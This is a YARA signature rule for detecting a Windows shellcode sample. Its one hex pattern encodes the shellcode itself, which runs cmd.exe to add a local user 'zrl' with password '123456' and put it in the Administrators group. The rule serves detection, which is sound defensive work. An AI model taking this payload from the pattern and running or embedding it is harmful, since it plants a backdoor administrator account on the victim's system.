rule Win_Tool_Shellcode_15063_1
{
strings:
	$a0 = { eb1b5b31c05031c088435d53bbad23867cffd331c050bbfaca817cffd3e8e0ffffff636d642e657865202f63206e65742075736572207a726c20313233343536202f616464202626206e6574206c6f63616c67726f75702041646d696e6973747261746f7273202f616464207a726c202626206e65742075736572207a726c }

condition:
	$a0
}

        
